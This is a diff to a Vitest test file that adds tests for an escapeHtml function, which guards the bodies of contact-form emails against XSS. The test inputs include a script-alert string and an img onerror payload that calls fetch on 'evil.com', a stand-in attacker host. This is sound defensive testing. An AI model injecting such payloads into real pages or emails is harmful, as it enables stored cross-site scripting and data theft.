@@ -8,6 +8,7 @@
  */
 import { describe, it, expect } from "vitest";
 import { validateContactForm, VALID_SURFACES } from "@/lib/validation";
+import { escapeHtml } from "@/lib/email";
 
 const valid = {
   name: "Marcus Stone",
@@ -92,5 +93,32 @@ describe("Server-side validation parity", () => {
       "porcelain", "solid-surface", "other",
     ];
     expect([...VALID_SURFACES].sort()).toEqual(expected.sort());
+  });
+});
+
+describe("escapeHtml — email body XSS prevention", () => {
+  it("escapes all five dangerous HTML characters", () => {
+    expect(escapeHtml('<script>alert("xss")&</script>')).toBe(
+      "&lt;script&gt;alert(&quot;xss&quot;)&amp;&lt;/script&gt;",
+    );
+  });
+
+  it("escapes single quotes (attribute breakout)", () => {
+    expect(escapeHtml("it's a ' test")).toBe("it&#39;s a &#39; test");
+  });
+
+  it("escapes img onerror payload (stored XSS via email)", () => {
+    const payload = '<img src=x onerror="fetch(\'https://evil.com\')">';
+    const escaped = escapeHtml(payload);
+    expect(escaped).not.toContain("<");
+    expect(escaped).not.toContain(">");
+  });
+
+  it("passes through clean strings unchanged", () => {
+    expect(escapeHtml("Hello world 123")).toBe("Hello world 123");
+  });
+
+  it("handles empty string", () => {
+    expect(escapeHtml("")).toBe("");
   });
 });
